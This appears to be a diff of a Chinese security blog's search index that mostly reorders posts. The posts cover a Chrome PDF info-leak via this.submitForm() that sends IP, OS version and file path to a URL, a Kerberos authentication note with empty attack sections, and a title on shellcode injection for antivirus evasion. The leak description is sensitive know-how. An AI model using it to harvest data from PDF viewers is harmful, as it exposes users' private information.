@@ -19,6 +19,25 @@
       </tags>
   </entry>
   <entry>
+    <title>Chrome浏览器打开PDF造成的信息泄露</title>
+    <url>/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80PDF%E9%80%A0%E6%88%90%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。</p>
+<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对  this.submitForm()这个Javascript API （Adobe中对该函数的定义是将表单提交到指定URL）的操作进行控制，从而导致漏洞利用。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>通过调用this.submitForm(‘<a href="http://baidu.com&/#39;)%E5%8D%B3%E5%8F%AF%E5%90%91%E4%BB%BB%E6%84%8FURL%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE">http://baidu.com&#39;)即可向任意URL发送数据</a></p>
+<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875408476.jpg" alt="构造恶意代码"></p>
+<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875425444.jpg" alt="请求信息"></p>
+<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875449933.jpg" alt="接收信息"></p>
+<p>根据发送的数据可知该漏洞可泄露的信息如下：<br>1.用户ip<br>2.操作系统及Chrome版本号<br>3.PDF所在计算机的绝对路径路径</p>
+<h1 id="附加（内置PDF阅读器所支持的JavascriptAPI）"><a href="#附加（内置PDF阅读器所支持的JavascriptAPI）" class="headerlink" title="附加（内置PDF阅读器所支持的JavascriptAPI）"></a>附加（内置PDF阅读器所支持的JavascriptAPI）</h1><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">app</span><span class="selector-class">.launchURL</span>()</span><br><span class="line"><span class="selector-tag">app</span><span class="selector-class">.media</span><span class="selector-class">.getURLdata</span>()</span><br><span class="line"><span class="selector-tag">app</span><span class="selector-class">.alert</span>()</span><br><span class="line"><span class="selector-tag">app</span><span class="selector-class">.execDialog</span>()</span><br><span class="line"><span class="selector-tag">doc</span><span class="selector-class">.getURL</span>()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="安全建议："><a href="#安全建议：" class="headerlink" title="安全建议："></a>安全建议：</h1><p>虽然该漏洞不能直接造成代码执行，但在实际攻击中，有助于攻击者进一步获取目标信息，提高后续攻击的成功率（例如配合WinRAR的那个漏洞）目前补丁未出，建议暂时不要用chrome查看pdf，不打开来历不明的pdf文件。</p>
+]]></content>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Awvs11批量添加脚本 V2.0（基于上一次修改 增加6种扫描模式）</title>
     <url>/Awvs11%E6%89%B9%E9%87%8F%E6%B7%BB%E5%8A%A0%E8%84%9A%E6%9C%AC%20V2.0%EF%BC%88%E5%9F%BA%E4%BA%8E%E4%B8%8A%E4%B8%80%E6%AC%A1%E4%BF%AE%E6%94%B9%20%E5%A2%9E%E5%8A%A06%E7%A7%8D%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在原先增加多线程的基础上做了两处修改。<br>1.awvs中密码不需要手动加密成sha256<br>2.增加6种扫描模式（AWVS中的，原先是默认全扫描）</p>
@@ -37,25 +56,6 @@
 ]]></content>
       <tags>
         <tag>Python</tag>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Chrome浏览器打开PDF造成的信息泄露</title>
-    <url>/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80PDF%E9%80%A0%E6%88%90%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。</p>
-<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对  this.submitForm()这个Javascript API （Adobe中对该函数的定义是将表单提交到指定URL）的操作进行控制，从而导致漏洞利用。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>通过调用this.submitForm(‘<a href="http://baidu.com&/#39;)%E5%8D%B3%E5%8F%AF%E5%90%91%E4%BB%BB%E6%84%8FURL%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE">http://baidu.com&#39;)即可向任意URL发送数据</a></p>
-<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875408476.jpg" alt="构造恶意代码"></p>
-<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875425444.jpg" alt="请求信息"></p>
-<p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875449933.jpg" alt="接收信息"></p>
-<p>根据发送的数据可知该漏洞可泄露的信息如下：<br>1.用户ip<br>2.操作系统及Chrome版本号<br>3.PDF所在计算机的绝对路径路径</p>
-<h1 id="附加（内置PDF阅读器所支持的JavascriptAPI）"><a href="#附加（内置PDF阅读器所支持的JavascriptAPI）" class="headerlink" title="附加（内置PDF阅读器所支持的JavascriptAPI）"></a>附加（内置PDF阅读器所支持的JavascriptAPI）</h1><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">app</span><span class="selector-class">.launchURL</span>()</span><br><span class="line"><span class="selector-tag">app</span><span class="selector-class">.media</span><span class="selector-class">.getURLdata</span>()</span><br><span class="line"><span class="selector-tag">app</span><span class="selector-class">.alert</span>()</span><br><span class="line"><span class="selector-tag">app</span><span class="selector-class">.execDialog</span>()</span><br><span class="line"><span class="selector-tag">doc</span><span class="selector-class">.getURL</span>()</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="安全建议："><a href="#安全建议：" class="headerlink" title="安全建议："></a>安全建议：</h1><p>虽然该漏洞不能直接造成代码执行，但在实际攻击中，有助于攻击者进一步获取目标信息，提高后续攻击的成功率（例如配合WinRAR的那个漏洞）目前补丁未出，建议暂时不要用chrome查看pdf，不打开来历不明的pdf文件。</p>
-]]></content>
-      <tags>
         <tag>渗透</tag>
       </tags>
   </entry>
@@ -100,6 +100,33 @@
 ]]></content>
       <tags>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kerberos认证协议及漏洞复现笔记</title>
+    <url>/Kerberos%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近这段时间通过阅读相关资料初步了解到了kerberos认证协议的相关知识，因此有了此文，记录我对该认证过程的一些理解，文中所写的都是简化过后的过程，方便记忆而已，如果需要深入了解各阶段发生了什么请勿参考此文。因为是自己理解，如有问题，请指正。</p>
+<h1 id="相关名词"><a href="#相关名词" class="headerlink" title="相关名词"></a>相关名词</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Client-A ：客户机</span><br><span class="line">KDC：域控</span><br><span class="line">Server-B：服务器</span><br><span class="line">AS ：认证服务器</span><br><span class="line">TGT ：票据许可票据</span><br><span class="line">TGS ：票据授权服务器</span><br><span class="line">ST ：服务许可票据</span><br><span class="line">SessionKey ：会话密钥</span><br><span class="line">NTLM Hash ：密码散列</span><br></pre></td></tr></table></figure>
+<h1 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h1><p>将总体简化，并分为三个阶段，每个阶段有两个步骤</p>
+<p><img src="https://photo.o0o0.club/_Kerberos%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/1574065802479.png"></p>
+<h2 id="第一阶段-获取票据许可票据-TGT"><a href="#第一阶段-获取票据许可票据-TGT" class="headerlink" title="第一阶段:获取票据许可票据(TGT)"></a>第一阶段:获取票据许可票据(TGT)</h2><p>客户端先用NTLM Hash加密一个时间戳然后与Client-A的信息和一个随机数一起组合成AS_REQ发送给认证服务器(AS)，AS收到AS_REQ后先获取了Client-A的信息，然后在数据库中验证用户的访问权限,生成票据许可票据(TGT)和会话密钥(SessionKey-1)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 0x1. Client-A --&gt; KDC[AS]</span><br><span class="line">请求票据许可</span><br><span class="line"></span><br><span class="line"> 0x2. Client-A &lt;-- KDC[AS]</span><br><span class="line">返回TGT+SessionKey1</span><br></pre></td></tr></table></figure>
+
+<h2 id="第二阶段-获取服务票-Ticket"><a href="#第二阶段-获取服务票-Ticket" class="headerlink" title="第二阶段:获取服务票(Ticket)"></a>第二阶段:获取服务票(Ticket)</h2><p>Client-A对收到的报文解密，然后将TGT以及包含用户名称、网络地址、时间的鉴别符发往票据授权服务器(TGS)，TGS对TGT和鉴别符进行解密，认证通过后返回服务票(Ticket)和SessionKey-2</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x3. Client-A --&gt; KDC[TGS]</span><br><span class="line">请求服务许可</span><br><span class="line">PS：黄金票据攻击发送在此步骤</span><br><span class="line"></span><br><span class="line">0x4. Client-A &lt;-- KDC[TGS]</span><br><span class="line">返回ST+SessionKey2</span><br></pre></td></tr></table></figure>
+
+<h2 id="第三阶段-获得服务"><a href="#第三阶段-获得服务" class="headerlink" title="第三阶段:获得服务"></a>第三阶段:获得服务</h2><p>Client-A将Ticket和认证消息发送给Server-B，Server-B验证Ticket和认证信息中的相匹配，则允许Client-A访问服务，如果需要双向鉴别，则Server-B返回认证信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x5. Client-A --&gt; Server-B</span><br><span class="line">请求服务</span><br><span class="line">PS:白银票据攻击发生在此步骤</span><br><span class="line"></span><br><span class="line">0x6. Client-A &lt;-- Server-B</span><br><span class="line">允许访问或提供服务器鉴别符</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="跨域认证"><a href="#跨域认证" class="headerlink" title="跨域认证"></a>跨域认证</h1><p>Client-A、KDC-A、Server-B、KDC-B</p>
+<p><img src="https://photo.o0o0.club/_Kerberos%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/1574065857800.png"></p>
+<h2 id="获取TGT"><a href="#获取TGT" class="headerlink" title="获取TGT"></a>获取TGT</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Client-A --&gt; KDC-A[AS]</span><br><span class="line">请求认证</span><br><span class="line"></span><br><span class="line">Client-A --&gt; KDC-A[AS]</span><br><span class="line">返回TGT+SessionKey1</span><br></pre></td></tr></table></figure>
+<h2 id="获取Ticket"><a href="#获取Ticket" class="headerlink" title="获取Ticket"></a>获取Ticket</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Client-A --&gt; KDC-A[TGS]</span><br><span class="line">跨域请求Server-B</span><br><span class="line"></span><br><span class="line">KDC-A[TGS] --&gt; KDC-B[TGS]</span><br><span class="line">KDC-A验证通过，请求KDC-B</span><br><span class="line"></span><br><span class="line">KDC-A[TGS] &lt;-- KDC-B[TGS]</span><br><span class="line">验证通过，返回Ticket+Session2</span><br><span class="line"></span><br><span class="line">Client-A &lt;-- KDC-A[TGS]</span><br><span class="line">返回Ticket+SessionKey2</span><br></pre></td></tr></table></figure>
+<h2 id="访问资源"><a href="#访问资源" class="headerlink" title="访问资源"></a>访问资源</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Client-A --&gt; Server-B</span><br><span class="line">请求服务</span><br><span class="line"></span><br><span class="line">Client-A &lt;-- Server-B</span><br><span class="line">允许访问或提供服务器鉴别符</span><br></pre></td></tr></table></figure>
+
+<h1 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h1><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><h2 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h2>]]></content>
+      <tags>
+        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -157,33 +184,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Kerberos认证协议及漏洞复现笔记</title>
-    <url>/Kerberos%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近这段时间通过阅读相关资料初步了解到了kerberos认证协议的相关知识，因此有了此文，记录我对该认证过程的一些理解，文中所写的都是简化过后的过程，方便记忆而已，如果需要深入了解各阶段发生了什么请勿参考此文。因为是自己理解，如有问题，请指正。</p>
-<h1 id="相关名词"><a href="#相关名词" class="headerlink" title="相关名词"></a>相关名词</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Client-A ：客户机</span><br><span class="line">KDC：域控</span><br><span class="line">Server-B：服务器</span><br><span class="line">AS ：认证服务器</span><br><span class="line">TGT ：票据许可票据</span><br><span class="line">TGS ：票据授权服务器</span><br><span class="line">ST ：服务许可票据</span><br><span class="line">SessionKey ：会话密钥</span><br><span class="line">NTLM Hash ：密码散列</span><br></pre></td></tr></table></figure>
-<h1 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h1><p>将总体简化，并分为三个阶段，每个阶段有两个步骤</p>
-<p><img src="https://photo.o0o0.club/_Kerberos%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/1574065802479.png"></p>
-<h2 id="第一阶段-获取票据许可票据-TGT"><a href="#第一阶段-获取票据许可票据-TGT" class="headerlink" title="第一阶段:获取票据许可票据(TGT)"></a>第一阶段:获取票据许可票据(TGT)</h2><p>客户端先用NTLM Hash加密一个时间戳然后与Client-A的信息和一个随机数一起组合成AS_REQ发送给认证服务器(AS)，AS收到AS_REQ后先获取了Client-A的信息，然后在数据库中验证用户的访问权限,生成票据许可票据(TGT)和会话密钥(SessionKey-1)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 0x1. Client-A --&gt; KDC[AS]</span><br><span class="line">请求票据许可</span><br><span class="line"></span><br><span class="line"> 0x2. Client-A &lt;-- KDC[AS]</span><br><span class="line">返回TGT+SessionKey1</span><br></pre></td></tr></table></figure>
-
-<h2 id="第二阶段-获取服务票-Ticket"><a href="#第二阶段-获取服务票-Ticket" class="headerlink" title="第二阶段:获取服务票(Ticket)"></a>第二阶段:获取服务票(Ticket)</h2><p>Client-A对收到的报文解密，然后将TGT以及包含用户名称、网络地址、时间的鉴别符发往票据授权服务器(TGS)，TGS对TGT和鉴别符进行解密，认证通过后返回服务票(Ticket)和SessionKey-2</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x3. Client-A --&gt; KDC[TGS]</span><br><span class="line">请求服务许可</span><br><span class="line">PS：黄金票据攻击发送在此步骤</span><br><span class="line"></span><br><span class="line">0x4. Client-A &lt;-- KDC[TGS]</span><br><span class="line">返回ST+SessionKey2</span><br></pre></td></tr></table></figure>
-
-<h2 id="第三阶段-获得服务"><a href="#第三阶段-获得服务" class="headerlink" title="第三阶段:获得服务"></a>第三阶段:获得服务</h2><p>Client-A将Ticket和认证消息发送给Server-B，Server-B验证Ticket和认证信息中的相匹配，则允许Client-A访问服务，如果需要双向鉴别，则Server-B返回认证信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x5. Client-A --&gt; Server-B</span><br><span class="line">请求服务</span><br><span class="line">PS:白银票据攻击发生在此步骤</span><br><span class="line"></span><br><span class="line">0x6. Client-A &lt;-- Server-B</span><br><span class="line">允许访问或提供服务器鉴别符</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="跨域认证"><a href="#跨域认证" class="headerlink" title="跨域认证"></a>跨域认证</h1><p>Client-A、KDC-A、Server-B、KDC-B</p>
-<p><img src="https://photo.o0o0.club/_Kerberos%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/1574065857800.png"></p>
-<h2 id="获取TGT"><a href="#获取TGT" class="headerlink" title="获取TGT"></a>获取TGT</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Client-A --&gt; KDC-A[AS]</span><br><span class="line">请求认证</span><br><span class="line"></span><br><span class="line">Client-A --&gt; KDC-A[AS]</span><br><span class="line">返回TGT+SessionKey1</span><br></pre></td></tr></table></figure>
-<h2 id="获取Ticket"><a href="#获取Ticket" class="headerlink" title="获取Ticket"></a>获取Ticket</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Client-A --&gt; KDC-A[TGS]</span><br><span class="line">跨域请求Server-B</span><br><span class="line"></span><br><span class="line">KDC-A[TGS] --&gt; KDC-B[TGS]</span><br><span class="line">KDC-A验证通过，请求KDC-B</span><br><span class="line"></span><br><span class="line">KDC-A[TGS] &lt;-- KDC-B[TGS]</span><br><span class="line">验证通过，返回Ticket+Session2</span><br><span class="line"></span><br><span class="line">Client-A &lt;-- KDC-A[TGS]</span><br><span class="line">返回Ticket+SessionKey2</span><br></pre></td></tr></table></figure>
-<h2 id="访问资源"><a href="#访问资源" class="headerlink" title="访问资源"></a>访问资源</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Client-A --&gt; Server-B</span><br><span class="line">请求服务</span><br><span class="line"></span><br><span class="line">Client-A &lt;-- Server-B</span><br><span class="line">允许访问或提供服务器鉴别符</span><br></pre></td></tr></table></figure>
-
-<h1 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h1><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><h2 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h2>]]></content>
-      <tags>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Mysql注入总结(待填坑)</title>
     <url>/Mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93(%E5%BE%85%E5%A1%AB%E5%9D%91)/</url>
     <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="输入密码，查看文章" /><label>输入密码，查看文章</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="632c087ea73bd0a17f1147b528fb57d156a1024954ef7ec61264f985c6ffe65f">e6922e63ef9b00860b19c520399ebeb127f4ac058d7014dbc1e7e7159839e1f3da23cfdaac40e2764b8157618ed8e3efb30a13df2ef9851f21dac78d8fbc5c4814ab13b86b1767dd67503f70d9946aa3070daf10a95427395e6f7e59b6f6da47412e4b7ab49f259f286fb05ed35a13e85fd69d0e71088a704fdd944f6e023980e73530b9c0102590cb868796d9b094a7486649052e4f4cc5a228c3cb4168be9c</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
@@ -192,7 +192,7 @@
       </tags>
   </entry>
   <entry>
-    <title>Python socket在mulitprocessing、threading、asyncio中的实现</title>
+    <title>Python Socket在mulitprocessing、threading、asyncio中的实现</title>
     <url>/Python%20socket%E5%9C%A8mulitprocessing%E3%80%81threading%E3%80%81asyncio%E4%B8%AD%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要是记录下三种实现异步非阻塞socket网络编程的方法，一来加深印象，二来以便日后用到时对其用法生疏。不讨论三种实现方法的优略。</p>
 <table>
@@ -282,7 +282,7 @@
       </tags>
   </entry>
   <entry>
-    <title>Virmach 黑五优惠监测脚本(利用server酱实现微信收信)</title>
+    <title>Virmach 黑五优惠监测脚本(利用Server酱实现微信收信)</title>
     <url>/Virmach%20%E9%BB%91%E4%BA%94%E4%BC%98%E6%83%A0%E7%9B%91%E6%B5%8B%E8%84%9A%E6%9C%AC(%E5%88%A9%E7%94%A8server%E9%85%B1%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E6%94%B6%E4%BF%A1)/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>垃圾代码采用的是python3+server酱达到自动监测并将符合要(pian)求(yi)的机器信息推送至微信。</p>
 <p>server酱：</p>
@@ -321,7 +321,7 @@
       </tags>
   </entry>
   <entry>
-    <title>【学习笔记】((void (*)())exec)()的理解</title>
+    <title>【学习笔记】((Void (*)())Exec)()的理解</title>
     <url>/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91((void%20()())exec)()%E7%9A%84%E7%90%86%E8%A7%A3/</url>
     <content><![CDATA[<p>在理解之前，首先回忆一下函数指针的声明和调用。（<a href="http://c.biancheng.net/view/2023.html">C语言函数指针</a>）</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明一个函数指针</span></span><br><span class="line"><span class="keyword">void</span> (*p)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将函数Func的入口地址赋值给指针p</span></span><br><span class="line">p = Func;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数指针有两种方式</span></span><br><span class="line">p(); <span class="comment">// 简易写法</span></span><br><span class="line"></span><br><span class="line">(*p)(); <span class="comment">//标准写法</span></span><br></pre></td></tr></table></figure>
@@ -368,6 +368,16 @@
       </tags>
   </entry>
   <entry>
+    <title>你必须非常努力，才能看起来毫不费力。</title>
+    <url>/%E4%BD%A0%E5%BF%85%E9%A1%BB%E9%9D%9E%E5%B8%B8%E5%8A%AA%E5%8A%9B%EF%BC%8C%E6%89%8D%E8%83%BD%E7%9C%8B%E8%B5%B7%E6%9D%A5%E6%AF%AB%E4%B8%8D%E8%B4%B9%E5%8A%9B%E3%80%82/</url>
+    <content><![CDATA[<p>有一群人，他们积极自律，每天按计划行事，有条不紊；他们不张扬，把自己当成最卑微的小草，等待着人生开出花朵的那天。他们早晨5点多起来健身，你在睡觉；7点开始享受丰盛的早餐，蛋白质维生素淀粉粗纤维样样俱全，为新的一天起了一个好头，当他们收拾妥当准备开始一整天的工作时，你还在睡觉；</p>
+<p>他们用上午的高效时间完成了一个又一个任务，甚至发现的新的商机，发现了有可能给人生带来改观的机遇，当午餐时间临近，他们伸了伸腰，准备稍作休息，此时你终于起床。<br>他们的午餐不铺张浪费，却营养全面，他们有选择的进食，因为清楚的知道自己想要的是什么，而你也在起床之后但觉到了饿意，你早早的洗了把脸，甚至连牙都没刷，打开冰箱，拿出了昨晚跟朋友high过之后带回来的薯条以及可乐；<br>午睡之后，他们重新积极的投入工作，而你也终于吃饱喝足，坐在了电脑前。是的，你的一天开始了。<br>晚上回到家里，他们也打开了电脑，也许是为了完成白天没来得及做完的工作，也许是因为前两天刚报了一个网络课堂，此时你还沉浸在dota中，你发的贴子还不够有人气，你发现空老师又更新微薄了，电视剧里男女猪脚还没有最后在一起，作恶多端的女二号还没有得到应有的报应。<br>终于，22点到了，他们停下了工作，或许去满满的书架上拿下了一本书，或许拿起了自己心爱的乐器打算练练手，或许已经上床睡觉。当然，睡之前他们会想一想，自己在这一天都做了什么，有什么收获，又有什么教训。<br>最后，他们又重新提醒了一下自己那个埋在内心深处的梦想，然后满意的睡去了。此时的你还在等待升级，还在顶贴子，还在刷微薄，还在为了男一号女一号哭哭啼啼，你的一天才刚刚开始精彩。<br>后半夜，你隐约感到了困意，依依不舍的关掉了电脑，身上已经很臭，你却懒得去洗一个澡。你走向了乱糟糟的床，钻进了肮脏的被窝，掏出了手机——是的，爪机党伤不起。<br>你隐约知道自己的身边有那么一群“他们”，可是你却没有办法实实在在的感受到他们的存在。直到有一天，你和“他/她”终于浪漫的相见了——<br>他/她是老总，你是普通的打工仔；<br>他/她是主任，你是弱爆了的小职员；<br>他/她游历各国，念着你想念的大学，拍着你想拍的照片，过着你想过的生活，他/她各种恣意的小清新，<br>而你，是的，我知道你恨小清新，可是这又有什么关系？事实已经如此，你就是那个电脑荧光照射下的SB。</p>
+]]></content>
+      <tags>
+        <tag>鸡汤</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>关于FK01在使用TAP获取镜像流量时阻断不生效问题的解决记录</title>
     <url>/%E5%85%B3%E4%BA%8EFK01%E5%9C%A8%E4%BD%BF%E7%94%A8TAP%E8%8E%B7%E5%8F%96%E9%95%9C%E5%83%8F%E6%B5%81%E9%87%8F%E6%97%B6%E9%98%BB%E6%96%AD%E4%B8%8D%E7%94%9F%E6%95%88%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>FK01在使用TAP获取镜像流量后发出的reset报文不被交换机转发</p>
@@ -399,17 +409,7 @@
       </tags>
   </entry>
   <entry>
-    <title>你必须非常努力，才能看起来毫不费力。</title>
-    <url>/%E4%BD%A0%E5%BF%85%E9%A1%BB%E9%9D%9E%E5%B8%B8%E5%8A%AA%E5%8A%9B%EF%BC%8C%E6%89%8D%E8%83%BD%E7%9C%8B%E8%B5%B7%E6%9D%A5%E6%AF%AB%E4%B8%8D%E8%B4%B9%E5%8A%9B%E3%80%82/</url>
-    <content><![CDATA[<p>有一群人，他们积极自律，每天按计划行事，有条不紊；他们不张扬，把自己当成最卑微的小草，等待着人生开出花朵的那天。他们早晨5点多起来健身，你在睡觉；7点开始享受丰盛的早餐，蛋白质维生素淀粉粗纤维样样俱全，为新的一天起了一个好头，当他们收拾妥当准备开始一整天的工作时，你还在睡觉；</p>
-<p>他们用上午的高效时间完成了一个又一个任务，甚至发现的新的商机，发现了有可能给人生带来改观的机遇，当午餐时间临近，他们伸了伸腰，准备稍作休息，此时你终于起床。<br>他们的午餐不铺张浪费，却营养全面，他们有选择的进食，因为清楚的知道自己想要的是什么，而你也在起床之后但觉到了饿意，你早早的洗了把脸，甚至连牙都没刷，打开冰箱，拿出了昨晚跟朋友high过之后带回来的薯条以及可乐；<br>午睡之后，他们重新积极的投入工作，而你也终于吃饱喝足，坐在了电脑前。是的，你的一天开始了。<br>晚上回到家里，他们也打开了电脑，也许是为了完成白天没来得及做完的工作，也许是因为前两天刚报了一个网络课堂，此时你还沉浸在dota中，你发的贴子还不够有人气，你发现空老师又更新微薄了，电视剧里男女猪脚还没有最后在一起，作恶多端的女二号还没有得到应有的报应。<br>终于，22点到了，他们停下了工作，或许去满满的书架上拿下了一本书，或许拿起了自己心爱的乐器打算练练手，或许已经上床睡觉。当然，睡之前他们会想一想，自己在这一天都做了什么，有什么收获，又有什么教训。<br>最后，他们又重新提醒了一下自己那个埋在内心深处的梦想，然后满意的睡去了。此时的你还在等待升级，还在顶贴子，还在刷微薄，还在为了男一号女一号哭哭啼啼，你的一天才刚刚开始精彩。<br>后半夜，你隐约感到了困意，依依不舍的关掉了电脑，身上已经很臭，你却懒得去洗一个澡。你走向了乱糟糟的床，钻进了肮脏的被窝，掏出了手机——是的，爪机党伤不起。<br>你隐约知道自己的身边有那么一群“他们”，可是你却没有办法实实在在的感受到他们的存在。直到有一天，你和“他/她”终于浪漫的相见了——<br>他/她是老总，你是普通的打工仔；<br>他/她是主任，你是弱爆了的小职员；<br>他/她游历各国，念着你想念的大学，拍着你想拍的照片，过着你想过的生活，他/她各种恣意的小清新，<br>而你，是的，我知道你恨小清新，可是这又有什么关系？事实已经如此，你就是那个电脑荧光照射下的SB。</p>
-]]></content>
-      <tags>
-        <tag>鸡汤</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内存注入shellcode实现msf与cs免杀</title>
+    <title>内存注入Shellcode实现msf与cs免杀</title>
